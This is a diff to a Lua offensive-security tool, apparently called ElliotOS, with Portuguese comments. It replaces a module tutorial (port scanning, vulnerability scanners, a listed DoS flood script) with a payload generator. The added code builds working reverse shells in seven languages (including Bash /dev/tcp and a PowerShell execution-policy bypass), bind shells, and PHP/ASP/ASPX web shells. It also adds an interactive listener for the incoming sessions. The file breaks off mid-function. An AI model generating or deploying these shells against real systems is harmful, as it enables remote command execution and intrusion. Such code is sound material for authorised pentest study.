-        '    headers = {["Authorization"] = "Bearer SEU_TOKEN"},\n'..
-        '    quiet   = true\n'..
-        '})')
-
-    secao("HTTP POST e net.fetch")
-    ex("POST simples",
-        'local body, code = net.post(\n'..
-        '    "http://httpbin.org/post",\n'..
-        '    "usuario=teste&senha=123"\n'..
-        ')\n'..
-        'print(code, body:sub(1,100))')
-    ex("net.fetch — interface completa",
-        'local body, code, hdrs = net.fetch("https://api.site.com/v1", {\n'..
-        '    method  = "POST",\n'..
-        '    body    = \'{"key":"value"}\',\n'..
-        '    headers = {["Content-Type"]="application/json"},\n'..
-        '    timeout = 8,\n'..
-        '    quiet   = true\n'..
-        '})\n'..
-        'print(code, body)')
-
-    secao("TCP e UDP")
-    ex("conectar via TCP — banner grab",
-        'local s = net.tcp("192.168.1.1", 22, 3)\n'..
-        'if s then\n'..
-        '    local banner = s:recv(256)\n'..
-        '    print("Banner SSH:", banner)\n'..
-        '    s:close()\n'..
-        'end')
-    ex("UDP — enviar pacote",
-        'local s = net.udp("8.8.8.8", 53, 2)\n'..
-        'if s then\n'..
-        '    s:send("ping")\n'..
-        '    s:close()\n'..
-        'end')
-
-    secao("Port Scan")
-    ex("scan de portas — retorna lista de abertas",
-        'local abertas = net.scan("192.168.1.1", 1, 1024)\n'..
-        'for _, porta in ipairs(abertas) do\n'..
-        '    print("Aberta:", porta)\n'..
-        'end')
-
-    secao("DNS")
-    ex("resolver hostname",
-        'local ip = net.dns("google.com")\n'..
-        'print("IP:", ip)')
-
-    secao("Ping")
-    ex("verificar se host responde",
-        'local ok, ms = net.ping("192.168.1.1")\n'..
-        'if ok then print("Online! RTT:", ms, "ms")\n'..
-        'else print("Offline ou sem resposta") end')
-
-    if pausar() then return end
-end
-
--- ── SEÇÃO 3: Módulo sys ───────────────────────────────────────
-local function modulo_sys()
-    titulo("3. Módulo sys — Threads e Sistema")
-    info("sys permite rodar código em paralelo e medir tempo real.")
-
-    secao("Tempo real")
-    ex("medir duração de uma operação",
-        'local t0 = sys.time()\n'..
-        'net.get("http://google.com", {quiet=true})\n'..
-        'print(string.format("Demorou: %.0f ms", (sys.time()-t0)*1000))')
-    ex("timestamp em ms — útil para logs",
-        'print("Agora:", sys.time_ms())')
-    ex("sleep sem spawnar processo",
-        'sys.sleep(500)   -- dorme 500ms\n'..
-        'sys.sleep(0.5)   -- mesmo efeito')
-
-    secao("Threads — execução paralela")
-    info("IMPORTANTE: cada thread tem sua própria VM Lua isolada.")
-    info("Passe valores como literais via string.format.")
-    ex("thread simples",
-        'local tid = sys.thread([[\n'..
-        '    local s = net.tcp("192.168.1.1", 80, 2)\n'..
-        '    if s then s:send("GET / HTTP/1.0\\r\\n\\r\\n") s:close() end\n'..
-        '    return "ok"\n'..
-        ']])\n'..
-        'local resultado = sys.join(tid, 10000)\n'..
-        'print("Thread retornou:", resultado)')
-    ex("múltiplas threads em paralelo",
-        'local portas = {80, 443, 22, 3306, 8080}\n'..
-        'local tids = {}\n'..
-        'for _, p in ipairs(portas) do\n'..
-        '    local code = string.format([[\n'..
-        '        local s = net.tcp("192.168.1.1", %d, 1)\n'..
-        '        if s then s:close(); return %d end\n'..
-        '        return 0\n'..
-        '    ]], p, p)\n'..
-        '    tids[#tids+1] = sys.thread(code)\n'..
-        'end\n'..
-        'for _, tid in ipairs(tids) do\n'..
-        '    local p = sys.join(tid, 5000)\n'..
-        '    if tonumber(p) and tonumber(p) > 0 then\n'..
-        '        print("Aberta:", p)\n'..
-        '    end\n'..
-        'end')
-
-    secao("Canal entre threads")
-    ex("sys.channel — comunicação real entre threads",
-        'local ch = sys.channel()\n'..
-        'local code = string.format([[\n'..
-        '    local f = io.open("/proc/self/fd/%d", "w")\n'..
-        '    f:write("dados da thread"); f:close()\n'..
-        ']], ch:fd_w())\n'..
-        'sys.thread(code)\n'..
-        'local msg = ch:recv(5000)\n'..
-        'print("Recebido:", msg)\n'..
-        'ch:close()')
-
-    secao("Informações do sistema")
-    ex("ver CPU, memória, OS",
-        'sys.info()')
-    ex("PID do processo atual",
-        'print("PID:", sys.pid())')
-    ex("variável de ambiente",
-        'print("HOME:", sys.env("HOME"))')
-
-    if pausar() then return end
-end
-
--- ── SEÇÃO 4: Módulo fs ────────────────────────────────────────
-local function modulo_fs()
-    titulo("4. Módulo fs — Arquivos e Diretórios")
-    info("fs cobre tudo de filesystem: ler, escrever, listar, mover.")
-
-    secao("Ler e escrever arquivos")
-    ex("escrever arquivo",
-        'fs.write((os.getenv("HOME") or ".").."..(_tmpdir).."/teste.txt", "conteúdo do arquivo")\n'..
-        'print("Arquivo criado!")')
-    ex("ler arquivo inteiro",
-        'local conteudo = fs.read("..(_tmpdir).."/teste.txt")\n'..
-        'print(conteudo)')
-    ex("adicionar ao final",
-        'fs.append("..(_tmpdir).."/log.txt", "nova linha\\n")')
-
-    secao("Verificar e navegar")
-    ex("verificar se existe",
-        'if fs.exists("..(_tmpdir).."/teste.txt") then\n'..
-        '    print("Existe!")\n'..
-        'end')
-    ex("listar diretório",
-        'local arquivos = fs.list(_tmpdir)\n'..
-        'for _, f in ipairs(arquivos) do\n'..
-        '    print(f)\n'..
-        'end')
-    ex("criar diretório",
-        'fs.mkdir("..(_tmpdir).."/minha_pasta")')
-    ex("glob — buscar por padrão",
-        'local luas = fs.glob(_tmpdir, "*.lua")\n'..
-        'for _, f in ipairs(luas) do print(f) end')
-
-    secao("Operações")
-    ex("copiar arquivo",
-        'fs.copy("..(_tmpdir).."/original.txt", "..(_tmpdir).."/copia.txt")')
-    ex("mover/renomear",
-        'fs.move("..(_tmpdir).."/velho.txt", "..(_tmpdir).."/novo.txt")')
-    ex("remover arquivo",
-        'fs.rm("..(_tmpdir).."/teste.txt")')
-    ex("info do arquivo",
-        'local info = fs.stat("..(_tmpdir).."/teste.txt")\n'..
-        'if info then\n'..
-        '    print("Tamanho:", info.size, "bytes")\n'..
-        '    print("É arquivo:", info.isfile)\n'..
-        'end')
-
-    if pausar() then return end
-end
-
--- ── SEÇÃO 5: Módulo mod ───────────────────────────────────────
-local function modulo_mod()
-    titulo("5. Módulo mod — Scanners de Pentest")
-    info("IMPORTANTE: Use apenas em ambientes próprios ou com autorização!")
-    info("Lab local: ms -p easy | ms -p med | ms -p hard")
-
-    secao("Como usar o lab local")
-    ex("subir lab médio na porta 8082",
-        '-- No terminal:\n'..
-        'ms -p med\n'..
-        '-- Depois use os scanners abaixo contra http://127.0.0.1:8082/')
-
-    secao("XSS — Cross-Site Scripting")
-    ex("scan XSS em parâmetro",
-        'mod.xss("http://127.0.0.1:8082/xss?msg=")\n'..
-        '-- Testa 364 payloads automaticamente')
-
-    secao("SQLi — SQL Injection")
-    ex("scan de injeção SQL",
-        'mod.sqli("http://127.0.0.1:8082/search?name=")\n'..
-        '-- Testa boolean, error-based, time-based')
-
-    secao("LFI — Local File Inclusion")
-    ex("scan LFI",
-        'mod.lfi("http://127.0.0.1:8082/file?f=")\n'..
-        '-- Testa path traversal e bypass de filtros')
-
-    secao("RCE — Remote Code Execution")
-    ex("scan RCE",
-        'mod.rce("http://127.0.0.1:8082/exec?cmd=")\n'..
-        '-- Detecta execução remota de comandos')
-
-    secao("Outros scanners")
-    ex("SSRF — Server Side Request Forgery",
-        'mod.ssrf("http://alvo.com/fetch?url=")')
-    ex("CORS — verificar headers de segurança",
-        'mod.cors("http://alvo.com")')
-    ex("Headers de segurança",
-        'mod.headers("http://alvo.com")')
-    ex("Spider — mapear links do site",
-        'mod.spider("http://alvo.com")')
-    ex("Recon passivo",
-        'mod.recon("alvo.com")')
-    ex("Scan completo automatizado",
-        'mod.chain("http://127.0.0.1:8082/")\n'..
-        '-- Roda todos os scanners em sequência')
-
-    secao("Via CLI (sem abrir REPL)")
-    ex("XSS direto pelo terminal",
-        'ms -x http://127.0.0.1:8082/xss?msg=')
-    ex("SQLi direto",
-        'ms -q http://127.0.0.1:8082/search?name=')
-
-    if pausar() then return end
-end
-
--- ── SEÇÃO 6: Módulo crypto ────────────────────────────────────
-local function modulo_crypto()
-    titulo("6. Módulo crypto — Hash e Encoding")
-
-    secao("Hashes")
-    ex("MD5",
-        'print(crypto.md5("ElliotOS"))')
-    ex("SHA256",
-        'print(crypto.sha256("senha123"))')
-    ex("SHA512",
-        'print(crypto.sha512("texto"))')
-    ex("HMAC",
-        'print(crypto.hmac("mensagem", "chave-secreta"))')
-
-    secao("Base64")
-    ex("encode",
-        'local enc = crypto.b64enc("texto secreto")\n'..
-        'print(enc)')
-    ex("decode",
-        'local dec = crypto.b64dec("dGV4dG8gc2VjcmV0bw==")\n'..
-        'print(dec)')
-
-    secao("AES")
-    ex("criptografar e descriptografar",
-        'local enc = crypto.aes_enc("mensagem", "chave-16-chars!!")\n'..
-        'local dec = crypto.aes_dec(enc, "chave-16-chars!!")\n'..
-        'print(dec)  --> mensagem')
-
-    secao("Hex")
-    ex("encode/decode hex",
-        'local h = crypto.hexenc("ABC")\n'..
-        'print(h)  --> 414243\n'..
-        'print(crypto.hexdec("414243"))  --> ABC')
-
-    secao("Via CLI")
-    ex("hash rápido pelo terminal",
-        'ms --md5 "texto"\n'..
-        'ms --sha256 "texto"\n'..
-        'ms --b64e "texto"\n'..
-        'ms --b64d "dGV4dG8="')
-
-    if pausar() then return end
-end
-
--- ── SEÇÃO 7: Módulo db ────────────────────────────────────────
-local function modulo_db()
-    titulo("7. Módulo db — Banco de Dados SQLite")
-    info("SQLite embutido — banco local sem servidor.")
-
-    secao("Operações básicas")
-    ex("criar banco e tabela",
-        'local banco = db.open("..(_tmpdir).."/meu_banco.db")\n'..
-        'db.exec(banco, [[\n'..
-        '    CREATE TABLE IF NOT EXISTS alvos (\n'..
-        '        id INTEGER PRIMARY KEY,\n'..
-        '        ip TEXT,\n'..
-        '        porta INTEGER,\n'..
-        '        servico TEXT\n'..
-        '    )\n'..
-        ']])')
-    ex("inserir dados",
-        'db.exec(banco, [[\n'..
-        '    INSERT INTO alvos (ip, porta, servico)\n'..
-        '    VALUES ("192.168.1.1", 80, "HTTP")\n'..
-        ']])')
-    ex("consultar dados",
-        'local rows = db.query(banco, "SELECT * FROM alvos")\n'..
-        'for _, row in ipairs(rows) do\n'..
-        '    print(row.ip, row.porta, row.servico)\n'..
-        'end')
-    ex("fechar banco",
-        'db.close(banco)')
-
-    secao("Caso de uso: salvar resultado de scan")
-    ex("salvar portas abertas no banco",
-        'local banco = db.open("..(_tmpdir).."/scan.db")\n'..
-        'db.exec(banco, "CREATE TABLE IF NOT EXISTS portas (ip TEXT, porta INTEGER)")\n'..
-        'local abertas = net.scan("192.168.1.1", 1, 1024)\n'..
-        'for _, p in ipairs(abertas) do\n'..
-        '    db.exec(banco, string.format(\n'..
-        '        "INSERT INTO portas VALUES (\'192.168.1.1\', %d)", p\n'..
-        '    ))\n'..
-        'end\n'..
-        'print("Salvas:", #abertas, "portas")\n'..
-        'db.close(banco)')
-
-    if pausar() then return end
-end
-
--- ── SEÇÃO 8: Scripts de exemplo ───────────────────────────────
-local function exemplos()
-    titulo("8. Scripts Completos de Exemplo")
-    info("Scripts prontos em ~/.lua-modules/examples/")
-
-    secao("Scripts disponíveis")
-    local scripts = {
-        {"recon.lua",    "Recon completo: ping, portas, banner, DNS"},
-        {"portscan.lua", "Port scanner rápido com threads"},
-        {"webcheck.lua", "Verifica headers de segurança de um site"},
-        {"hashcrack.lua","Compara hash com wordlist"},
-        {"nexus.lua",   "Flood UDP/TCP/HTTP/Slowloris"},
-    }
-    for _, s in ipairs(scripts) do
-        print(string.format("  %s%-14s%s %s", C.cmd, s[1], C.reset, C.dim..s[2]..C.reset))
+-- ── Detecção automática de IP local ──────────────────────────────
+local function get_local_ip()
+    local ok, out = pcall(sh.read,
+        "ip route get 1 2>/dev/null | awk '{print $NF;exit}'")
+    if ok and out and out:match('%d+%.%d+%.%d+%.%d+') then
+        return out:match('%d+%.%d+%.%d+%.%d+')
     end
-
-    secao("Rodar um script")
-    ex("executar script de exemplo",
-        'ms -f ~/.lua-modules/examples/recon.lua\n'..
-        '-- ou com argumento:\n'..
-        'ms -f ~/.lua-modules/examples/portscan.lua -- 192.168.1.1')
-
-    secao("Criar seu próprio script")
-    ex("template mínimo",
-        '#!/usr/bin/env ms\n'..
-        '-- meu_script.lua\n'..
-        'local alvo = arg[1] or "127.0.0.1"\n'..
-        'print("Testando:", alvo)\n'..
-        'local s = net.tcp(alvo, 80, 3)\n'..
-        'if s then\n'..
-        '    print("Porta 80 aberta!")\n'..
-        '    s:close()\n'..
-        'else\n'..
-        '    print("Porta 80 fechada")\n'..
-        'end')
-    ex("tornar executável e rodar direto",
-        'chmod +x meu_script.lua\n'..
-        './meu_script.lua 192.168.1.1')
-
-    if pausar() then return end
+    local ok2, out2 = pcall(sh.read, "hostname -I 2>/dev/null | awk '{print $1}'")
+    if ok2 and out2 and out2:match('%d+%.%d+%.%d+%.%d+') then
+        return out2:match('%d+%.%d+%.%d+%.%d+')
+    end
+    return '0.0.0.0'
 end
 
--- ── Main loop ─────────────────────────────────────────────────
-local function main()
+-- ══════════════════════════════════════════════════════════════════
+-- GERADORES DE PAYLOAD
+-- ══════════════════════════════════════════════════════════════════
+
+local gen = {}
+
+-- ── REVERSE SHELL ─────────────────────────────────────────────────
+
+gen.reverse_lua = function(lhost, lport)
+    return '-- ElliotOS Reverse Shell -- Lua\n'
+        .. '-- Uso: ms -f shell.lua\n'
+        .. 'local H,P = \'' .. lhost .. '\',' .. tostring(lport) .. '\n'
+        .. [[local conn
+for i=1,5 do
+    local ok,c = pcall(net.tcp,H,P)
+    if ok and c then conn=c; break end
+    sys.sleep(3)
+end
+if not conn then os.exit(1) end
+local function cap(cmd)
+    local ok,r=pcall(sh.capture,cmd..' 2>&1')
+    return (ok and r and r~='') and r or '[sem output]\n'
+end
+local info='[+] '..sh.read('whoami')..'@'..sh.read('hostname')..'\n'
+pcall(function() conn:send(info) end)
+while true do
+    local cmd
+    for _=1,600 do
+        local ok,d=pcall(function() return conn:recv(4096) end)
+        if not ok then os.exit(0) end
+        if d and #d>0 then cmd=d; break end
+        sys.sleep(0.1)
+    end
+    if not cmd then break end
+    cmd=cmd:gsub('[\r\n]',''):match('^%s*(.-)%s*$')
+    if cmd=='__EXIT__' then pcall(function() conn:send('__BYE__\n') end); break end
+    if cmd~='' then
+        local r=cap(cmd)
+        if not r:match('\n$') then r=r..'\n' end
+        local ok=pcall(function() conn:send(r) end)
+        if not ok then break end
+    else pcall(function() conn:send('\n') end) end
+end
+pcall(function() conn:close() end)
+]]
+end
+
+gen.reverse_bash = function(lhost, lport)
+    return string.format([[
+#!/bin/bash
+# ElliotOS Reverse Shell — Bash
+# Uso: bash shell.sh
+LHOST='%s'
+LPORT=%d
+while true; do
+    bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1 && break
+    sleep 5
+done
+]], lhost, lport)
+end
+
+gen.reverse_python = function(lhost, lport)
+    return string.format([[
+#!/usr/bin/env python3
+# ElliotOS Reverse Shell — Python3
+import socket,subprocess,os,time
+
+LHOST='%s'
+LPORT=%d
+
+while True:
+    try:
+        s=socket.socket()
+        s.connect((LHOST,LPORT))
+        import os
+        info=f"[+] {{os.popen('whoami').read().strip()}}@{{os.popen('hostname').read().strip()}}\n"
+        s.send(info.encode())
+        while True:
+            cmd=s.recv(4096).decode().strip()
+            if not cmd: break
+            if cmd=='__EXIT__': s.send(b'__BYE__\n'); break
+            out=subprocess.getoutput(cmd+' 2>&1')+'\n'
+            s.send(out.encode())
+        s.close()
+        break
+    except:
+        time.sleep(5)
+]], lhost, lport)
+end
+
+gen.reverse_php = function(lhost, lport)
+    return string.format([[
+<?php
+// ElliotOS Reverse Shell — PHP
+// Uso: coloque no servidor e acesse via browser
+$lhost='%s'; $lport=%d;
+$s=fsockopen($lhost,$lport);
+$info="[+] ".shell_exec('whoami')."@".shell_exec('hostname')."\n";
+fwrite($s,$info);
+while(true){
+    $cmd=fread($s,4096);
+    if(!$cmd) break;
+    $cmd=trim($cmd);
+    if($cmd=='__EXIT__'){fwrite($s,"__BYE__\n");break;}
+    if($cmd!=''){
+        $out=shell_exec($cmd.' 2>&1')."\n";
+        fwrite($s,$out);
+    }
+}
+fclose($s);
+]], lhost, lport)
+end
+
+gen.reverse_c = function(lhost, lport)
+    local h = string.format('#define LHOST "%s"\n#define LPORT %d\n', lhost, lport)
+    return [[
+/* ElliotOS Reverse Shell — C
+   Compilar: cxx shell.c -o shell && ./shell
+*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#define BUF 4096
+]] .. h .. [[
+int main(void){
+    int fd; char buf[BUF],cmd[BUF]; ssize_t n;
+    struct sockaddr_in addr;
+    struct hostent *he=gethostbyname(LHOST);
+    if(!he) return 1;
+retry:
+    fd=socket(AF_INET,SOCK_STREAM,0);
+    memset(&addr,0,sizeof(addr));
+    addr.sin_family=AF_INET;
+    addr.sin_port=htons(LPORT);
+    memcpy(&addr.sin_addr,he->h_addr,he->h_length);
+    if(connect(fd,(struct sockaddr*)&addr,sizeof(addr))<0){
+        close(fd); sleep(5); goto retry;
+    }
+    send(fd,"[+] shell conectado\n",21,0);
+    while((n=recv(fd,buf,BUF-1,0))>0){
+        buf[n]=0;
+        char *c=buf;
+        while(*c=='\r'||*c=='\n') c++;
+        size_t l=strlen(c);
+        while(l>0&&(c[l-1]=='\r'||c[l-1]=='\n')) c[--l]=0;
+        if(!strcmp(c,"__EXIT__")){send(fd,"__BYE__\n",8,0);break;}
+        if(!l){send(fd,"\n",1,0);continue;}
+        snprintf(cmd,BUF,"%s 2>&1",c);
+        FILE *fp=popen(cmd,"r");
+        if(!fp){send(fd,"[erro]\n",7,0);continue;}
+        while(fgets(buf,BUF,fp)) send(fd,buf,strlen(buf),0);
+        pclose(fp);
+    }
+    close(fd); return 0;
+}
+]]
+end
+
+gen.reverse_perl = function(lhost, lport)
+    return string.format([[
+#!/usr/bin/perl
+# ElliotOS Reverse Shell — Perl
+use Socket;
+my($lhost,$lport)=('%s',%d);
+socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));
+connect(S,sockaddr_in($lport,inet_aton($lhost)));
+open(STDIN,'>&S'); open(STDOUT,'>&S'); open(STDERR,'>&S');
+exec('/bin/sh -i');
+]], lhost, lport)
+end
+
+gen.reverse_powershell = function(lhost, lport)
+    return string.format([[
+# ElliotOS Reverse Shell — PowerShell
+# Uso: powershell -ep bypass -f shell.ps1
+$lhost='%s'; $lport=%d
+while($true){
+    try{
+        $client=New-Object Net.Sockets.TcpClient($lhost,$lport)
+        $stream=$client.GetStream()
+        $info=[Text.Encoding]::UTF8.GetBytes("[+] $env:USERNAME@$env:COMPUTERNAME`n")
+        $stream.Write($info,0,$info.Length)
+        $buf=New-Object byte[] 4096
+        while(($n=$stream.Read($buf,0,$buf.Length))-gt 0){
+            $cmd=[Text.Encoding]::UTF8.GetString($buf,0,$n).Trim()
+            if($cmd-eq'__EXIT__'){$stream.Write([Text.Encoding]::UTF8.GetBytes("__BYE__`n"),0,8);break}
+            $out=try{Invoke-Expression $cmd 2>&1|Out-String}catch{$_.Exception.Message}
+            $b=[Text.Encoding]::UTF8.GetBytes($out+"`n")
+            $stream.Write($b,0,$b.Length)
+        }
+        $client.Close(); break
+    }catch{ Start-Sleep 5 }
+}
+]], lhost, lport)
+end
+
+-- ── BIND SHELL ────────────────────────────────────────────────────
+
+gen.bind_lua = function(lport)
+    return '-- ElliotOS Bind Shell -- Lua\n'
+        .. '-- Conectar: ms -f server.lua -- <ip_alvo> ' .. tostring(lport) .. '\n'
+        .. 'local srv = net.listen(' .. tostring(lport) .. ')\n'
+        .. [[while true do
+    local ok,conn = pcall(function() return srv:accept() end)
+    if not ok or not conn then break end
+    local info='[+] '..sh.read('whoami')..'@'..sh.read('hostname')..'\n'
+    pcall(function() conn:send(info) end)
     while true do
-        local op = menu()
-        if     op == "1" then lua_basico()
-        elseif op == "2" then modulo_net()
-        elseif op == "3" then modulo_sys()
-        elseif op == "4" then modulo_fs()
-        elseif op == "5" then modulo_mod()
-        elseif op == "6" then modulo_crypto()
-        elseif op == "7" then modulo_db()
-        elseif op == "8" then exemplos()
-        elseif op == "0" or op == nil then
-            print(C.ok.."\nValeu! Bora hackear (com autorização)! 💜"..C.reset)
-            break
+        local cmd
+        for _=1,600 do
+            local ok2,d=pcall(function() return conn:recv(4096) end)
+            if not ok2 then break end
+            if d and #d>0 then cmd=d; break end
+            sys.sleep(0.1)
+        end
+        if not cmd then break end
+        cmd=cmd:gsub('[\r\n]',''):match('^%s*(.-)%s*$')
+        if cmd=='__EXIT__' then pcall(function() conn:send('__BYE__\n') end); break end
+        if cmd~='' then
+            local ok3,r=pcall(sh.capture,cmd..' 2>&1')
+            local out=(ok3 and r and r~='') and r or '[sem output]\n'
+            if not out:match('\n$') then out=out..'\n' end
+            pcall(function() conn:send(out) end)
+        else pcall(function() conn:send('\n') end) end
+    end
+    pcall(function() conn:close() end)
+end
+]]
+end
+
+gen.bind_bash = function(lport)
+    return string.format([[
+#!/bin/bash
+# ElliotOS Bind Shell — Bash
+# Conectar: nc <ip_alvo> %d
+ncat -lvp %d -e /bin/bash
+]], lport, lport)
+end
+
+gen.bind_python = function(lport)
+    return string.format([[
+#!/usr/bin/env python3
+# ElliotOS Bind Shell — Python3
+# Conectar: nc <ip_alvo> %d
+import socket,subprocess
+s=socket.socket()
+s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+s.bind(('0.0.0.0',%d))
+s.listen(1)
+while True:
+    c,addr=s.accept()
+    while True:
+        cmd=c.recv(4096).decode().strip()
+        if not cmd: break
+        out=subprocess.getoutput(cmd)+'\n'
+        c.send(out.encode())
+    c.close()
+]], lport, lport)
+end
+
+-- ── WEB SHELL ─────────────────────────────────────────────────────
+
+gen.web_php = function()
+    return [[
+<?php
+// ElliotOS Web Shell — PHP
+// Upload e acesse: http://alvo.com/shell.php?cmd=id
+if(isset($_REQUEST['cmd'])){
+    $cmd=$_REQUEST['cmd'];
+    $out=shell_exec($cmd.' 2>&1');
+    echo '<pre>'.$out.'</pre>';
+}else{
+    echo '<form>CMD: <input name="cmd"><input type="submit"></form>';
+}
+]]
+end
+
+gen.web_lua = function()
+    return [[
+-- ElliotOS Web Shell — Lua (para servidores Lua/OpenResty)
+-- GET /shell?cmd=id
+local cmd = ngx.var.arg_cmd or 'id'
+local ok, out = pcall(sh.capture, cmd .. ' 2>&1')
+ngx.say(ok and out or '[erro]')
+]]
+end
+
+gen.web_asp = function()
+    return [[
+<%
+' ElliotOS Web Shell — ASP Classic
+Dim cmd, out
+cmd = Request("cmd")
+If cmd <> "" Then
+    Dim sh: Set sh = CreateObject("WScript.Shell")
+    Dim exec: Set exec = sh.Exec("cmd /c " & cmd)
+    out = exec.StdOut.ReadAll()
+    Response.Write "<pre>" & Server.HTMLEncode(out) & "</pre>"
+End If
+%>
+<form><input name="cmd"><input type="submit"></form>
+]]
+end
+
+gen.web_aspx = function()
+    return [[
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<!-- ElliotOS Web Shell — ASPX -->
+<script runat="server">
+void Page_Load(object s, EventArgs e){
+    string cmd=Request["cmd"];
+    if(cmd!=null){
+        Process p=new Process();
+        p.StartInfo.FileName="cmd.exe";
+        p.StartInfo.Arguments="/c "+cmd;
+        p.StartInfo.UseShellExecute=false;
+        p.StartInfo.RedirectStandardOutput=true;
+        p.Start();
+        Response.Write("<pre>"+Server.HtmlEncode(p.StandardOutput.ReadToEnd())+"</pre>");
+    }
+}
+</script>
+<form><input name="cmd"><input type="submit" value="exec"></form>
+]]
+end
+
+-- ══════════════════════════════════════════════════════════════════
+-- LISTENER EMBUTIDO
+-- ══════════════════════════════════════════════════════════════════
+
+local function run_listener(lport)
+    clear()
+    P(C.ok, [[
+  ╔══════════════════════════════════════════════╗
+  ║   ElliotOS — Handler Aguardando...          ║
+  ╚══════════════════════════════════════════════╝]])
+    P(C.dim, '  Porta: '..lport..'  |  Ctrl+C para sair\n')
+
+    local ok_l, srv = pcall(net.listen, lport)
+    if not ok_l or not srv then
+        P(C.err, '[!] Falha ao abrir porta '..lport..': '..tostring(srv))
+        return
+    end
+    P(C.info, '[*] Aguardando conexao...')
+
+    local ok_a, conn = pcall(function() return srv:accept() end)
+    if not ok_a or not conn then
+        P(C.err, '[!] Falha ao aceitar conexao.')
+        return
+    end
+    P(C.ok, '[+] Sessao aberta!\n')
+
+    -- Recebe banner
+    local function recv_wait(t)
+        for _=1,math.floor((t or 10)/0.1) do
+            local ok2,d=pcall(function() return conn:recv(65536) end)
+            if not ok2 then return nil end
+            if d and #d>0 then return d end
+            sys.sleep(0.1)
+        end
+        return nil
+    end
+
+    local banner = recv_wait(8)
+    if banner then P(C.info, banner) end
+
+    -- Loop de comandos
+    local rodando = true
+    while rodando do
+        io.write(C.cmd..'shell> '..C.reset)
+        local cmd = io.read('*l')
+        if not cmd then break end
+        cmd = cmd:match('^%s*(.-)%s*$')
+        if cmd == '' then
+        elseif cmd == 'exit' or cmd == 'quit' then
+            pcall(function() conn:send('__EXIT__\n') end)
+            recv_wait(3)
+            P(C.info, '[*] Sessao encerrada.')
+            rodando = false
+        elseif cmd == 'help' then
+            P(C.dim, '  exit/quit  encerra\n  clear      limpa tela\n  <cmd>      envia ao alvo')
+        elseif cmd == 'clear' then
+            io.write('\027[2J\027[H')
         else
-            print(C.err.."Opção inválida."..C.reset)
+            local ok_s = pcall(function() conn:send(cmd..'\n') end)
+            if not ok_s then
+                P(C.err, '[!] Conexao perdida.')
+                rodando = false
+            else
+                local out = recv_wait(30)
+                if not out then
+                    P(C.err, '[!] Timeout — sem resposta.')
+                    rodando = false
+                elseif out:match('__BYE__') then
+                    P(C.info, '[*] Alvo desconectou.')
+                    rodando = false
+                else
+                    io.write(out)
+                    if not out:match('\n$') then print() end
+                end
+            end
+        end
+    end
+    pcall(function() conn:close() end)
+    pcall(function() srv:close() end)
+    P(C.dim, '[*] Handler encerrado.')
+end
+
+-- ══════════════════════════════════════════════════════════════════
+-- MENU PRINCIPAL
+-- ══════════════════════════════════════════════════════════════════
+
+local function show_payload(code, lang, ptype, outfile)
+    clear()
+    P(C.ok, '\n  ╔══════════════════════════════════════════════╗')
+    P(C.ok, '  ║   ElliotOS — Payload Gerado                 ║')
+    P(C.ok, '  ╚══════════════════════════════════════════════╝\n')
+    P(C.dim, '  Tipo : '..ptype)
+    P(C.dim, '  Lang : '..lang)
+    if outfile then
+        P(C.dim, '  File : '..outfile)
+    end
+    print()
+    P(C.cmd, '─────────────────────────────────────────────')
+    -- Imprime linha por linha para não cortar
+    for linha in (code..'\n'):gmatch('([^\n]*)\n') do
+        print(C.dim..linha..C.reset)
+    end
+    P(C.cmd, '─────────────────────────────────────────────')
+    print()
+
+    if outfile then
+        local path = outfile
+        if not path:match('^/') then
+            local home = sys.env('HOME') or '/data/data/com.termux/files/home'
+            path = home .. '/' .. path
+        end
+        local saved = fs.write(path, code)
+        if saved then
+            P(C.ok, '[+] Salvo em: '..path)
+        else
+            P(C.err, '[!] Erro ao salvar em: '..path)
         end
     end
 end
 
+local function ext_for(lang)
+    local exts = {
+        lua='lua', bash='sh', python='py', php='php',
+        c='c', perl='pl', powershell='ps1',
+        asp='asp', aspx='aspx',
+    }
+    return exts[lang] or 'txt'
+end
+
+local function main()
+    clear()
+    P(C.mag, [[
+  ╔══════════════════════════════════════════════════╗
+  ║   ElliotOS — Payload Generator                  ║
+  ║   Reverse Shell · Bind Shell · Web Shell        ║
+  ╚══════════════════════════════════════════════════╝]])
+    print()
+
+    -- Tipo de payload
+    local ptype = choose('Tipo de payload:', {
+        'reverse_shell',
+        'bind_shell',
+        'web_shell',
+    }, 'reverse_shell')
+
+    -- Linguagem
+    local lang_opts
+    if ptype == 'reverse_shell' then
+        lang_opts = {'lua','bash','python','php','c','perl','powershell'}
+    elseif ptype == 'bind_shell' then
+        lang_opts = {'lua','bash','python'}
+    else
+        lang_opts = {'php','lua','asp','aspx'}
+    end
+    local lang = choose('Linguagem:', lang_opts, lang_opts[1])
+
+    -- LHOST / LPORT
+    local lhost, lport
+    if ptype == 'reverse_shell' then
+        local auto_ip = get_local_ip()
+        lhost = ask('\n  LHOST (seu IP)', auto_ip)
+        lport = tonumber(ask('  LPORT', '4444')) or 4444
+    elseif ptype == 'bind_shell' then
+        lport = tonumber(ask('\n  LPORT (porta no alvo)', '4444')) or 4444
+    end
+
+    -- Output
+    local out_mode = choose('Onde salvar:', {
+        'mostrar na tela',
+        'salvar em arquivo',
+        'mostrar + salvar',
+    }, 'mostrar na tela')
+
+    local outfile = nil
+    if out_mode ~= 'mostrar na tela' then
+        local fname = 'shell.'..ext_for(lang)
+        outfile = ask('  Nome do arquivo', fname)
+    end
+
+    -- Gera o payload
+    local code
+    if ptype == 'reverse_shell' then
+        local fn = gen['reverse_'..lang]
+        code = fn and fn(lhost, lport) or '-- payload nao disponivel para '..lang
+    elseif ptype == 'bind_shell' then
+        local fn = gen['bind_'..lang]
+        code = fn and fn(lport) or '-- payload nao disponivel para '..lang
+    else
+        local fn = gen['web_'..lang]
+        code = fn and fn() or '-- payload nao disponivel para '..lang
+    end
+
+    -- Mostra o payload
+    if out_mode == 'salvar em arquivo' then
+        local path = outfile
+        if not path:match('^/') then
+            local home = sys.env('HOME') or '/data/data/com.termux/files/home'
+            path = home .. '/' .. path
+        end
+        local saved = fs.write(path, code)
+        clear()
+        if saved then
+            P(C.ok, '\n  [+] Payload salvo em: '..path)
+        else
+            P(C.err, '\n  [!] Erro ao salvar em: '..path)
+        end
+    else
